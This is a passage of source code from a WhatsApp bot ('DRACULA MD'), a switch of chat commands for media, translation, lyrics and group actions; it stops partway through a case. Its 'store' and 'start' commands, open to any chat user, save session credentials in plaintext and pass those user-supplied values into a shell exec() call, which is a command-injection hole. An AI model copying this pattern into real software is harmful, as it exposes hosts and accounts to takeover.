case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161': {
    // Fetch the audio file
    var resttt = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`);
    
    // Send the audio
    const sentMessage = await conn.sendMessage(m.chat, { 
        audio: resttt, 
        mimetype: 'audio/mp4', 
        ptt: true 
    });

    // Reply to the audio with the indented message
    if (sentMessage.key) {
        await conn.sendMessage(m.chat, { 
            text: '> 𝙳𝚁𝙰𝙲𝚄𝙻𝙰   𝙼𝙳', 
            quoted: sentMessage 
        });
    }
}
break;




case 'reportbug':
	if (!q) return reply(`Example: ${
        prefix + command
      } 𝐇𝐢 𝐝𝐞𝐯, 𝐭𝐡𝐞 𝐟𝐞𝐚𝐭𝐮𝐫𝐞 "𝐩𝐥𝐚𝐲" 𝐢𝐬 𝐧𝐨𝐭 𝐰𝐨𝐫𝐤𝐢𝐧𝐠.`)
reply('We are forwarding this to the *`𝐜𝐫𝐞𝐚𝐭𝐨𝐫`* 👍\n> Thank you.')
conn.sendMessage(`2349060853189@s.whatsapp.net`, { image: { url: 'https://telegra.ph/file/0437dfca1c8c72d4baa5d.jpg' }, caption: `𝐇𝐞𝐥𝐥𝐨 *𝔻ℝ𝔸ℂ𝕌𝕃𝔸 𝔽𝕏* 👋\n 𝐒𝐨𝐦𝐞𝐨𝐧𝐞 𝐡𝐚𝐬 𝐚 𝐫𝐞𝐩𝐨𝐫𝐭/𝐫𝐞𝐪𝐮𝐞𝐬𝐭 𝐟𝐨𝐫 *${command}*!!\n\n𝐅𝐫𝐨𝐦: *${pushname}*\n𝐍𝐮𝐦𝐛𝐞𝐫: _${m.sender.split('@')[0]}_` }, { quoted: m })
break



case 'out': {
    if (!isGroup) return onlyGroup();
    if (!isOwner) return onlyOwner();
    await loading();
    
    await reply("𝔹𝕐𝔼, 𝕄𝕆𝕋ℍ𝔼ℝ𝔽𝕌ℂ𝕂𝔼ℝ𝕊!!"); // Cool font message
    
    await conn.groupLeave(from); // Leave group after sending the message
}
break;




case 'cecan-indo': {
await loading();
    try {
        // Log the start of the request
        console.log("Fetching data from the API...");

        // API call
        const apiUrl = 'https://api.agatz.xyz/api/indonesia';
        const response = await fetch(apiUrl);
        
        // Check if the response is ok (status code 200)
        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }

        // Parse the JSON response
        const json = await response.json();

        // Log the API response to the console
        console.log("API Response:", json);

        // Extract the image URL from the response
        const imageUrl = json.data?.url; // Accessing URL from the response

        // Check if the image URL is present
        if (!imageUrl) {
            return reply("𝔽𝕒𝕚𝕝𝕖𝕕 𝕥𝕠 𝕣𝕖𝕘𝕚𝕤𝕥𝕖𝕣 𝕒𝕟 𝕚𝕞𝕒𝕘𝕖 𝕦𝕣𝕝.");
        }

        // Prepare the caption with Italic font and indented quote
        const caption = "𝑯𝒆𝒓𝒆 𝒊𝒔 𝒂 𝑪𝒆𝒄𝒂𝒏 𝒇𝒓𝒐𝒎 𝑰𝒏𝒅𝒐𝒏𝒆𝒔𝒊𝒂 🇮🇩\n\n> 𝙳𝚁𝙰𝙲𝚄𝙻𝙰    𝙼𝙳";

        // Send the image with the caption
        await conn.sendMessage(from, {
            image: { url: imageUrl },
            caption: caption, // Caption added here
        }, { quoted: m });

    } catch (error) {
        console.error("Error in cecan-indo case:", error);
        // Optionally reply with an error message
        reply("𝔸𝕟 𝕖𝕣𝕣𝕠𝕣 𝕠𝕔𝕔𝕦𝕣𝕖𝕕 𝕒𝕥𝕥𝕖𝕞𝕡𝕥𝕚𝕟𝕘 𝕥𝕠 𝕗𝕖𝕥𝕔𝕙 𝕕𝕒𝕥𝕒.");
    }
    break;
}

case 'cecan-china': {
await loading();
    try {
        console.log("Fetching data from the China API...");
        const apiUrl = 'https://api.agatz.xyz/api/china';
        const response = await fetch(apiUrl);
        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
        const json = await response.json();
        console.log("API Response:", json);
        const imageUrl = json.data?.url;
        if (!imageUrl) return reply("𝔽𝕒𝕚𝕝𝕖𝕕 𝕥𝕠 𝕣𝕖𝕘𝕚𝕤𝕥𝕖𝕣 𝕒𝕟 𝕚𝕞𝕒𝕘𝕖 𝕦𝕣𝕝.");
        const caption = "𝑯𝒆𝒓𝒆 𝒊𝒔 𝒂 𝑪𝒆𝒄𝒂𝒏 𝒇𝒓𝒐𝒎 𝑪𝒉𝒊𝒏𝒂 🇨🇳\n\n> 𝙳𝚁𝙰𝙲𝚄𝙻𝙰    𝙼𝙳";
        await conn.sendMessage(from, { image: { url: imageUrl }, caption: caption }, { quoted: m });
    } catch (error) {
        console.error("Error in cecan-china case:", error);
        reply("𝔸𝕟 𝕖𝕣𝕣𝕠𝕣 𝕠𝕔𝕔𝕦𝕣𝕖𝕕 𝕒𝕥𝕥𝕖𝕞𝕡𝕥𝕚𝕟𝕘 𝕥𝕠 𝕗𝕖𝕥𝕔𝕙 𝕕𝕒𝕥𝕒.");
    }
    break;
}

case 'cecan-japan': {
await loading();
    try {
        console.log("Fetching data from the Japan API...");
        const apiUrl = 'https://api.agatz.xyz/api/Japan';
        const response = await fetch(apiUrl);
        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
        const json = await response.json();
        console.log("API Response:", json);
        const imageUrl = json.data?.url;
        if (!imageUrl) return reply("𝔽𝕒𝕚𝕝𝕖𝕕 𝕥𝕠 𝕣𝕖𝕘𝕚𝕤𝕥𝕖𝕣 𝕒𝕟 𝕚𝕞𝕒𝕘𝕖 𝕦𝕣𝕝.");
        const caption = "𝑯𝒆𝒓𝒆 𝒊𝒔 𝒂 𝑪𝒆𝒄𝒂𝒏 𝒇𝒓𝒐𝒎 𝑱𝒂𝒑𝒂𝒏 🇯🇵\n\n> 𝙳𝚁𝙰𝙲𝚄𝙻𝙰    𝙼𝙳";
        await conn.sendMessage(from, { image: { url: imageUrl }, caption: caption }, { quoted: m });
    } catch (error) {
        console.error("Error in cecan-japan case:", error);
        reply("𝔸𝕟 𝕖𝕣𝕣𝕠𝕣 𝕠𝕔𝕔𝕦𝕣𝕖𝕕 𝕒𝕥𝕥𝕖𝕞𝕡𝕥𝕚𝕟𝕘 𝕥𝕠 𝕗𝕖𝕥𝕔𝕙 𝕕𝕒𝕥𝕒.");
    }
    break;
}

case 'cecan-malaysia': {
await loading();
    try {
        console.log("Fetching data from the Malaysia API...");
        const apiUrl = 'https://api.agatz.xyz/api/malaysia';
        const response = await fetch(apiUrl);
        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
        const json = await response.json();
        console.log("API Response:", json);
        const imageUrl = json.data?.url;
        if (!imageUrl) return reply("𝔽𝕒𝕚𝕝𝕖𝕕 𝕥𝕠 𝕣𝕖𝕘𝕚𝕤𝕥𝕖𝕣 𝕒𝕟 𝕚𝕞𝕒𝕘𝕖 𝕦𝕣𝕝.");
        const caption = "𝑯𝒆𝒓𝒆 𝒊𝒔 𝒂 𝑪𝒆𝒄𝒂𝒏 𝒇𝒓𝒐𝒎 𝑴𝒂𝒍𝒂𝒚𝒔𝒊𝒂 🇲🇾\n\n> 𝙳𝚁𝙰𝙲𝚄𝙻𝙰    𝙼𝙳";
        await conn.sendMessage(from, { image: { url: imageUrl }, caption: caption }, { quoted: m });
    } catch (error) {
        console.error("Error in cecan-malaysia case:", error);
        reply("𝔸𝕟 𝕖𝕣𝕣𝕠𝕣 𝕠𝕔𝕔𝕦𝕣𝕖𝕕 𝕒𝕥𝕥𝕖𝕞𝕡𝕥𝕚𝕟𝕘 𝕥𝕠 𝕗𝕖𝕥𝕔𝕙 𝕕𝕒𝕥𝕒.");
    }
    break;
}

case 'cecan-vietnam': {
await loading();
    try {
        console.log("Fetching data from the Vietnam API...");
        const apiUrl = 'https://api.agatz.xyz/api/vietnam';
        const response = await fetch(apiUrl);
        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
        const json = await response.json();
        console.log("API Response:", json);
        const imageUrl = json.data?.url;
        if (!imageUrl) return reply("𝔽𝕒𝕚𝕝𝕖𝕕 𝕥𝕠 𝕣𝕖𝕘𝕚𝕤𝕥𝕖𝕣 𝕒𝕟 𝕚𝕞𝕒𝕘𝕖 𝕦𝕣𝕝.");
        const caption = "𝑯𝒆𝒓𝒆 𝒊𝒔 𝒂 𝑪𝒆𝒄𝒂𝒏 𝒇𝒓𝒐𝒎 𝑽𝒊𝒆𝒕𝒏𝒂𝒎 🇻🇳\n\n> 𝙳𝚁𝙰𝙲𝚄𝙻𝙰    𝙼𝙳";
        await conn.sendMessage(from, { image: { url: imageUrl }, caption: caption }, { quoted: m });
    } catch (error) {
        console.error("Error in cecan-vietnam case:", error);
        reply("𝔸𝕟 𝕖𝕣𝕣𝕠𝕣 𝕠𝕔𝕔𝕦𝕣𝕖𝕕 𝕒𝕥𝕥𝕖𝕞𝕡𝕥𝕚𝕟𝕘 𝕥𝕠 𝕗𝕖𝕥𝕔𝕙 𝕕𝕒𝕥𝕒.");
    }
    break;
}

case 'cecan-korea': {
await loading();
    try {
        console.log("Fetching data from the Korea API...");
        const apiUrl = 'https://api.agatz.xyz/api/korea';
        const response = await fetch(apiUrl);
        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
        const json = await response.json();
        console.log("API Response:", json);
        const imageUrl = json.data?.url;
        if (!imageUrl) return reply("𝔽𝕒𝕚𝕝𝕖𝕕 𝕥𝕠 𝕣𝕖𝕘𝕚𝕤𝕥𝕖𝕣 𝕒𝕟 𝕚𝕞𝕒𝕘𝕖 𝕦𝕣𝕝.");
        const caption = "𝑯𝒆𝒓𝒆 𝒊𝒔 𝒂 𝑪𝒆𝒄𝒂𝒏 𝒇𝒓𝒐𝒎 𝑲𝒐𝒓𝒆𝒂 🇰🇷\n\n> 𝙳𝚁𝙰𝙲𝚄𝙻𝙰    𝙼𝙳";
        await conn.sendMessage(from, { image: { url: imageUrl }, caption: caption }, { quoted: m });
    } catch (error) {
        console.error("Error in cecan-korea case:", error);
        reply("𝔸𝕟 𝕖𝕣𝕣𝕠𝕣 𝕠𝕔𝕔𝕦𝕣𝕖𝕕 𝕒𝕥𝕥𝕖𝕞𝕡𝕥𝕚𝕟𝕘 𝕥𝕠 𝕗𝕖𝕥𝕔𝕙 𝕕𝕒𝕥𝕒.");
    }
    break;
}



case 'translate': {
    const langAbbreviation = args[0]; // Get the language abbreviation from the arguments
    const textToTranslate = m.quoted?.text || args.slice(1).join(' '); // Check if replying to a message or taking input

    // Check if language abbreviation is provided
    if (!langAbbreviation || !textToTranslate) {
        return reply(`\`ℙ𝕝𝕖𝕒𝕤𝕖 𝕡𝕣𝕠𝕧𝕚𝕕𝕖 𝕒 𝕝𝕒𝕟𝕘𝕦𝕒𝕘𝕖 𝕒𝕓𝕣𝕖𝕧𝕚𝕒𝕥𝕚𝕠𝕟 𝕒𝕟𝕕 𝕥𝕖𝕩𝕥 𝕥𝕠 𝕥𝕣𝕒𝕟𝕤𝕝𝕒𝕥𝕖.\`\n*𝔼𝕩𝕒𝕞𝕡𝕝𝕖: ${prefix + command} en 𝕙𝕖𝕝𝕝𝕠*`);
    }

    try {
        await loading();

        // API call
        const apiUrl = `https://api.popcat.xyz/translate?to=${langAbbreviation}&text=${encodeURIComponent(textToTranslate)}`;
        const response = await fetch(apiUrl);
        const json = await response.json();

        // Log the API response to the console
        console.log("Translation Response:", json);

        
// Validate API response
if (!json.translated) {
    return reply("𝔽𝕒𝕚𝕝𝕖𝕕 𝕥𝕠 𝕥𝕣𝕒𝕟𝕤𝕝𝕒𝕥𝕖 𝕥𝕙𝕖 𝕥𝕖𝕩𝕥. ℙ𝕝𝕖𝕒𝕤𝕖 𝕥𝕣𝕪 𝕒𝕘𝕒𝕚𝕟 𝕝𝕒𝕥𝕖𝕣.");
}

// Send the translated text
reply(`*🌍 𝕋𝕣𝕒𝕟𝕤𝕝𝕒𝕥𝕖𝕕 𝕋𝕖𝕩𝕥:*\n\n\`\`\`${json.translated}\`\`\``);



    } catch (error) {
        console.error("Error in translate case:", error);
        reply("𝔸𝕟 𝕖𝕣𝕣𝕠𝕣 𝕠𝕔𝕔𝕦𝕣𝕖𝕕 𝕨𝕙𝕚𝕝𝕖 𝕡𝕣𝕠𝕔𝕖𝕤𝕤𝕚𝕟𝕘 𝕪𝕠𝕦𝕣 𝕣𝕖𝕢𝕦𝕖𝕤𝕥. ℙ𝕝𝕖𝕒𝕤𝕖 𝕥𝕣𝕪 𝕒𝕘𝕒𝕚𝕟 𝕝𝕒𝕥𝕖𝕣.");
    }
    break;
}






case "generatepair": {
    if (!isOwner && !isGroupAdmins) 
        return m.reply(`❌ *Only Admins Are Allowed To Use This Command!*`);

    // Check if the user has provided a phone number
    if (!q) 
        return m.reply(`📲 *Please provide a phone number!*\n\n*Usage:*\n${prefix + command} <phone_number>`);

    const phoneNumber = q.trim(); // Extract and sanitize the phone number input

    // Validate the phone number format (basic check)
    const phoneRegex = /^[0-9]{10,15}$/; // Adjust the range as needed for valid phone numbers
    if (!phoneRegex.test(phoneNumber)) 
        return m.reply(`❌ *Invalid phone number format!*\n\n*Please enter a valid phone number without spaces or special characters.*`);

    await m.reply(`⏳ *Generating pair code for ${phoneNumber}...*`);

    try {
        // Perform API request
        const fetch = require('node-fetch');
        const apiUrl = `https://bk9.fun/tools/PairId?q=${encodeURIComponent(phoneNumber)}`;
        const response = await fetch(apiUrl);
        const data = await response.json();

        // Extract BK9 field
        if (!data.BK9) 
            return m.reply(`❌ *The API response did not contain the pair code (BK9).*\n\nCheck the API and try again.`);

        let pairCode = data.BK9;

        // Insert a dash after the first 4 characters
        if (pairCode.length > 4) {
            pairCode = pairCode.slice(0, 4) + '-' + pairCode.slice(4);
        }

        // Fancy message for the user
        m.reply(`🎉 *Pair Code Generated Successfully!*\n\n` +
            `📱 *Phone Number:* ${phoneNumber}\n` +
            `🔑 *Pair Code:* \n\n` +
            `👉 *${pairCode}*\n\n` +
            `✨ *Save and use this code wisely!*`);

        // Log response for debugging
        console.log("API Response:", data);

    } catch (err) {
        console.error("Error fetching pair code:", err);
        m.reply(`❌ *An error occurred while generating the pair code.*\n\nDetails: ${err.message}`);
    }
}
break;

case 'store': {
    if (!q) 
        return m.reply('❌ Please provide your phone number and session ID. Usage: !store <phone_number> <session_id_base64>');

    const input = q.split(' ');
    const phoneNumber = input[0];
    const sessionIdBase64 = input[1];

    if (!phoneNumber || !sessionIdBase64) 
        return m.reply('❌ Invalid input. Usage: !store <phone_number> <session_id_base64>');

    try {
        // Decode the session ID from base64 using Buffer
        const sessionIdDecoded = Buffer.from(sessionIdBase64, 'base64').toString('utf8');
        console.log(`Decoded session ID: ${sessionIdDecoded}`);

        // Define the file path for storing credentials
        const credFilePath = path.join(__dirname, 'database', 'cred.json');

        // Load existing data from creds file if it exists
        let creds = {};
        if (fs.existsSync(credFilePath)) {
            creds = JSON.parse(fs.readFileSync(credFilePath));
        }

        // Store the phone number and decoded session ID in the creds object
        creds[phoneNumber] = { sessionId: sessionIdDecoded };

        // Save the updated creds object to the file
        fs.writeFileSync(credFilePath, JSON.stringify(creds, null, 2));

        m.reply(`✅ Successfully stored phone number and session ID for ${phoneNumber}`);
    } catch (error) {
        console.error('Error decoding session ID:', error);
        m.reply('❌ An error occurred while storing the data.');
    }

    break;
}

case 'start': {
    if (!q) 
        return m.reply('❌ Please provide your phone number. Usage: !start <phone_number>');

    const phoneNumber = q.trim();

    // Define the file path for credentials
    const credFilePath = path.join(__dirname, 'database', 'cred.json');

    // Check if the credentials file exists
    if (!fs.existsSync(credFilePath)) 
        return m.reply('❌ Credentials file not found. Make sure to store data using !store first.');

    // Load the credentials from the file
    let creds = {};
    try {
        creds = JSON.parse(fs.readFileSync(credFilePath));
    } catch (error) {
        console.error('Error reading cred.json:', error);
        return m.reply('❌ Failed to read credentials file.');
    }

    // Check if the phone number exists in the credentials file
    if (!creds[phoneNumber]) 
        return m.reply('❌ This phone number is not registered in the credentials.');

    // Retrieve the session ID for the phone number
    const sessionId = creds[phoneNumber].sessionId;

    // Prepare the command to start the bot with the session ID
    const command = `node sharedrac.js ${phoneNumber} "${sessionId}"`;

    // Execute the command
    exec(command, (error, stdout, stderr) => {
        if (error) {
            console.error(`Exec error: ${error}`);
            return m.reply(`❌ Failed to start the bot: ${error.message}`);
        }
        if (stderr) {
            console.error(`Stderr: ${stderr}`);
            return m.reply(`❌ Error: ${stderr}`);
        }

        console.log(`Stdout: ${stdout}`);
        m.reply(`✅ Successfully turned on the bot for ${phoneNumber}`);
    });

    break;
}




case "quote": {
    if (!q) 
        return m.reply(`❌ *Please provide text for the quote!*\n\n*Usage:*\n${command} <your_text>\n\n*Example:*\n${command} Life is beautiful`);

    const text = q.trim(); // Sanitize the user input

    await loading(); // Optional: Display loading animation/message

    try {
        // Log the start of the request
        console.log("Fetching data from the API...");

        // API call
        const apiUrl = `https://api.popcat.xyz/quote?image=https://cdn.popcat.xyz/popcat.png&text=${encodeURIComponent(text)}&font=Poppins-Bold&name=Pop%20Cat`;
        const response = await fetch(apiUrl);

        // Check if the response is ok (status code 200)
        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }

        // Log the full API response
        console.log("API Response:", response.url);

        // Use the image URL directly (response.url is the generated image URL)
        const imageUrl = response.url;

        // Prepare the caption
        const caption = `𝑯𝒆𝒓𝒆 𝒊𝒔 𝒚𝒐𝒖𝒓 𝑸𝒖𝒐𝒕𝒆:\n*${text}*\n\n> 𝙳𝙾𝙽𝙴 𝙱𝚈 𝙳𝚁𝙰𝙲𝚄𝙻𝙰 𝙼𝙳`;

        // Send the image with the caption
        await conn.sendMessage(from, {
            image: { url: imageUrl },
            caption: caption,
        }, { quoted: m });

    } catch (error) {
        console.error("Error in quote case:", error);
        reply("𝔸𝕟 𝕖𝕣𝕣𝕠𝕣 𝕠𝕔𝕔𝕦𝕣𝕣𝕖𝕕 𝕨𝕙𝕚𝕝𝕖 𝕗𝕖𝕥𝕔𝕙𝕚𝕟𝕘 𝕥𝕙𝕖 𝕢𝕦𝕠𝕥𝕖.");
    }
    break;
}


case "lyrics": {
await loading ();
    if (!q) 
        return m.reply(`❌ *Please provide the name of the song!*\n\n*Usage:*\n${prefix + command} <song_name>\n\n*Example:*\n${prefix + command} Never Gonna Give You Up`);

    const songName = q.trim(); // Sanitize the user input


    await m.reply(`⏳ *Fetching lyrics for "${songName}"...*`);

    try {
        // Log the start of the request
        console.log("Fetching data from the API...");

        // API call
        const fetch = require('node-fetch');
        const apiUrl = `https://api.popcat.xyz/lyrics?song=${encodeURIComponent(songName)}`;
        const response = await fetch(apiUrl);

        // Check if the response is ok (status code 200)
        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }

        // Parse the JSON response
        const json = await response.json();

        // Log the API response to the console
        console.log("API Response:", json);

        // Check if the response contains the necessary data
        if (!json || !json.lyrics || !json.image) {
            return m.reply(`❌ *Could not find lyrics or image for "${songName}".*`);
        }

        // Extract necessary data from the response
        const title = json.title;
        const artist = json.artist;
        const lyrics = json.lyrics;
        const imageUrl = json.image;

        // Prepare the caption with cool fonts and formatting
        const caption = `
            𝑯𝒆𝒓𝒆 𝒂𝒓𝒆 𝒕𝒉𝒆 𝒍𝒚𝒓𝒊𝒄𝒔 𝒇𝒐𝒓 "${title}" 𝒃𝒚 ${artist}
            
            🎶 𝑳𝒚𝒓𝒊𝒄𝒔:
            *${lyrics}*

            > 𝙳𝙾𝙽𝙴 𝙱𝚈 𝙳𝚁𝙰𝙲𝚄𝙻𝙰 𝙼𝙳
        `;

        // Send the image with the caption
        await conn.sendMessage(from, {
            image: { url: imageUrl },
            caption: caption,
        }, { quoted: m });

    } catch (error) {
        console.error("Error in lyrics case:", error);
        reply(`❌ *An error occurred while fetching the lyrics.*\n\nDetails: ${error.message}`);
    }
    break;
}






case 'ping': {
    // Notify the user that the speed test is starting
    await loading();
    const startTime = new Date();

    // Send the initial message to indicate the speed test is in progress
    const pingMsg = await conn.sendMessage(m.chat, { 
        text: '🔄 *𝙳𝚁𝙰𝙲𝚄𝙻𝙰* 🔄\n\n🕒 *Checking Speed...*' 
    });

    // Delay before editing the message to show the results
    setTimeout(async () => {
        const latency = new Date() - startTime; // Calculate the latency in milliseconds

        // Determine the connection status based on latency
        const connectionStatus = latency < 200 
            ? '🟢 *𝗚𝗿𝗲𝗮𝘁 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗶𝗼𝗻*' 
            : '🔴 *𝗣𝗼𝗼𝗿 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗶𝗼𝗻*';

        // Send the edited message with the latency and status
        await conn.relayMessage(m.chat, {
            protocolMessage: {
                key: pingMsg.key,
                type: 14,
                editedMessage: {
                    conversation: `
━━━━━━━━━━━━━━━━━━━━━
⚡ *𝙳𝚁𝙰𝙲𝚄𝙻𝙰 𝙼𝙳 𝚂𝙿𝙴𝙴𝙳* ⚡
📶 *Response Time:* 
${latency} 𝙼𝚂
📊 *Status:* 
${connectionStatus}
━━━━━━━━━━━━━━━━━━━━━
🚀 *Optimized for Speed!*

> 𝙳𝚁𝙰𝙲𝚄𝙻𝙰  𝙼𝙳
                    `.trim()
                }
            }
        }, {});
    }, 1000); // 1-second delay for smoother UX
}
break;

case 'invite': {
    if (!isGroup) return reply('⛔ *This command can only be used in a group.*');
    if (!isBotGroupAdmins) return reply('⚠️ *The bot needs to be an admin first.*');
    if (!q) return reply(`*Please provide the number you want to invite.*\n\nExample:\n${prefix + command} 2349060853189`);
    if (q.includes('+')) return reply('❌ *Enter the number without the "+" symbol.*');
    if (isNaN(q)) return reply('❌ *Enter the number correctly, including the country code, without spaces.*');

    let group = m.chat;
    let link = 'https://chat.whatsapp.com/' + await conn.groupInviteCode(group);

    await conn.sendMessage(
        q + '@s.whatsapp.net', 
        {
            text: `≡ *GROUP INVITATION*\n\n📩 *You have been invited to join a group!*\n\n🌐 *Group Link:* ${link}\n\n📢 *Sent by:* @${m.sender.split('@')[0]}`,
            mentions: [m.sender]
        }
    );

    reply('✅ *The invite link has been sent to the user.*');
}





case 'play':
case 'songs': {
    if (!q) {
        return reply(`\`No music title detected.\`\n*Example: ${prefix + command} Alan Walker - Faded*`);
    }

    try {
        await loading();

        // Search for the video using the provided query
        let search = await yts(q);
        let video = search.videos[0];
        if (!video) {
            return reply("No results found for the provided query.");
        }

        let { title, url, thumbnail, timestamp, views, ago } = video;

        // Send the song image with details
        await conn.sendMessage(m.chat, {
            image: { url: thumbnail },
            caption: `🎵 *𝚃𝙸𝚃𝙻𝙴:* ${title}\n⏱️ *𝙳𝚄𝚁𝙰𝚃𝙸𝙾𝙽:* ${timestamp}\n👁️ *𝚅𝙸𝙴𝚆𝚂:* ${views}\n📅 *𝚄𝙿𝙻𝙾𝙰𝙳𝙴𝙳:* ${ago}\n🔗 *𝚄𝚁𝙻*: ${url}\n\n> 𝙳𝚁𝙰𝙲𝚄𝙻𝙰 𝙼𝙳`
        }, { quoted: m });

        // Fetch audio details using the new API
        let apiUrl = `https://bk9.fun/download/ytmp3?url=${encodeURIComponent(url)}`;
        let res;

        try {
            res = await fetch(apiUrl);
        } catch (fetchError) {
            console.error("Error fetching API:", fetchError);
            return reply("Failed to fetch audio. Please check your connection and try again.");
        }

        let json;
        try {
            json = await res.json();
        } catch (jsonError) {
            console.error("Error parsing JSON:", jsonError);
            return reply("Failed to process API response. Please try again later.");
        }

        // Validate API response
        if (!json.status || !json.BK9 || !json.BK9.downloadUrl) {
            return reply("Failed to fetch audio. Please try again later.");
        }

        // Extract the highest quality audio
        let audioList = json.BK9.downloadUrl;
        if (!Array.isArray(audioList) || audioList.length === 0) {
            return reply("No audio files found.");
        }

        let highestQualityAudio = audioList.reduce((prev, curr) =>
            parseInt(curr.quality) > parseInt(prev.quality) ? curr : prev
        );

        let { downloadUrl, title: audioTitle } = highestQualityAudio;

        // Send the highest quality audio file
        await conn.sendMessage(m.chat, {
            audio: { url: downloadUrl },
            mimetype: "audio/mp4",
            fileName: `${audioTitle}.mp3`,
        }, { quoted: m });

    } catch (error) {
        console.error("Error in play case:", error);
        reply("An unexpected error occurred while processing your request. Please try again later.");
    }
    break;
}








case "areact": {
    await loading();

   if (!isOwner) return onlyOwner();

    // Parse arguments for enabling/disabling
    if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1') {
        if (global.autoReactEnabled) return setReply("🟢 𝘼𝙪𝙩𝙤-𝙍𝙚𝙖𝙘𝙩 𝙞𝙨 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙚𝙣𝙖𝙗𝙡𝙚𝙙!");
        global.autoReactEnabled = true;
        setReply("✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙚𝙣𝙖𝙗𝙡𝙚𝙙 𝘼𝙪𝙩𝙤-𝙍𝙚𝙖𝙘𝙩!");
    } 
    else if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
        if (!global.autoReactEnabled) return setReply("🔴 𝘼𝙪𝙩𝙤-𝙍𝙚𝙖𝙘𝙩 𝙞𝙨 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙤𝙛𝙛!");
        global.autoReactEnabled = false;
        setReply("✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙙𝙞𝙨𝙖𝙗𝙡𝙚𝙙 𝘼𝙪𝙩𝙤-𝙍𝙚𝙖𝙘𝙩!");
    } 
    // If no arguments are provided, show usage instructions
    else if (!q) {
        setReply(`*🤖 𝘼𝙐𝙏𝙊-𝙍𝙀𝘼𝘾𝙏 𝙈𝙊𝘿𝙀 🤖*\n𝙐𝙨𝙚 ${prefix + command} 𝙤𝙣/𝙤𝙛𝙛 𝙩𝙤 𝙚𝙣𝙖𝙗𝙡𝙚 𝙤𝙧 𝙙𝙞𝙨𝙖𝙗𝙡𝙚.`);
    }
}
break;






case 'encode': {
    const textToEncode = m.quoted?.text || args.join(' '); 
    if (!textToEncode) 
        return reply(`\`ℙ𝕝𝕖𝕒𝕤𝕖 𝕡𝕣𝕠𝕧𝕚𝕕𝕖 𝕥𝕖𝕩𝕥 𝕥𝕠 𝕖𝕟𝕔𝕠𝕕𝕖 𝕠𝕣 𝕣𝕖𝕡𝕝𝕪 𝕥𝕠 𝕒 𝕞𝕖𝕤𝕤𝕒𝕘𝕖.\`\n*𝔼𝕩𝕒𝕞𝕡𝕝𝕖: ${prefix + command} 𝕙𝕖𝕝𝕝𝕠*`);

    try {
        await loading();

        const apiUrl = `https://api.popcat.xyz/encode?text=${encodeURIComponent(textToEncode)}`;
        const response = await fetch(apiUrl);
        const json = await response.json();

        if (!json.binary) {
            return reply("𝔽𝕒𝕚𝕝𝕖𝕕 𝕥𝕠 𝕖𝕟𝕔𝕠𝕕𝕖 𝕥𝕙𝕖 𝕥𝕖𝕩𝕥. ℙ𝕝𝕖𝕒𝕤𝕖 𝕥𝕣𝕪 𝕒𝕘𝕒𝕚𝕟 𝕝𝕒𝕥𝕖𝕣.");
        }

        // Reply with clean binary text
        reply(`${json.binary}`);

    } catch (error) {
        console.error("Error in encode case:", error);
        reply("𝔸𝕟 𝕖𝕣𝕣𝕠𝕣 𝕠𝕔𝕔𝕦𝕣𝕣𝕖𝕕 𝕨𝕙𝕚𝕝𝕖 𝕡𝕣𝕠𝕔𝕖𝕤𝕤𝕚𝕟𝕘 𝕪𝕠𝕦𝕣 𝕣𝕖𝕢𝕦𝕖𝕤𝕥. ℙ𝕝𝕖𝕒𝕤𝕖 𝕥𝕣𝕪 𝕒𝕘𝕒𝕚𝕟 𝕝𝕒𝕥𝕖𝕣.");
    }
    break;
}
case 'decode': {
    let binaryToDecode = m.quoted?.text || args.join(' ');

    // Sanitize input (remove backticks, newlines, and extra spaces)
    binaryToDecode = binaryToDecode.replace(/[`*\n\r]/g, '').trim();

    if (!binaryToDecode) 
        return reply(`\`ℙ𝕝𝕖𝕒𝕤𝕖 𝕡𝕣𝕠𝕧𝕚𝕕𝕖 𝕓𝕚𝕟𝕒𝕣𝕪 𝕔𝕠𝕕𝕖 𝕥𝕠 𝕕𝕖𝕔𝕠𝕕𝕖 𝕠𝕣 𝕣𝕖𝕡𝕝𝕪 𝕥𝕠 𝕒 𝕞𝕖𝕤𝕤𝕒𝕘𝕖.\`\n*𝔼𝕩𝕒𝕞𝕡𝕝𝕖: ${prefix + command} 𝟘𝟙𝟙𝟘𝟙𝟙𝟘𝟙𝟙𝟘𝟘𝟟*`);

    try {
        await loading();

        // API call
        const apiUrl = `https://api.popcat.xyz/decode?binary=${encodeURIComponent(binaryToDecode)}`;
        const response = await fetch(apiUrl);
        const json = await response.json();

        if (!json.text) {
            return reply("𝔽𝕒𝕚𝕝𝕖𝕕 𝕥𝕠 𝕕𝕖𝕔𝕠𝕕𝕖 𝕥𝕙𝕖 𝕓𝕚𝕟𝕒𝕣𝕪. ℙ𝕝𝕖𝕒𝕤𝕖 𝕖𝕟𝕤𝕦𝕣𝕖 𝕥𝕙𝕖 𝕚𝕟𝕡𝕦𝕥 𝕚𝕤 𝕧𝕒𝕝𝕚𝕕 𝕓𝕚𝕟𝕒𝕣𝕪 𝕒𝕟𝕕 𝕥𝕣𝕪 𝕒𝕘𝕒𝕚𝕟.");
        }

